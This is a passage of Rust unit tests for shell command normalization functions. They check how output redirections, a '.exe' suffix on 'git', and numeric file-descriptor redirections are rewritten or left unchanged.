    assert_eq!(
        normalize_command("command >> /usr/local/log").as_ref(),
        "command >> /usr/local/log",
        "pure redirection after command builtin is not a wrapper invocation"
    );
}

#[test]
fn test_attached_redirection_normalization_strips_exe_suffix() {
    assert_eq!(
        normalize_command_word_token(r#""git.exe">/dev/null"#),
        Some("git >/dev/null".to_string())
    );
}

#[test]
fn test_numeric_fd_redirection_is_not_rewritten() {
    assert_eq!(normalize_command_word_token("2>/dev/null"), None);
}
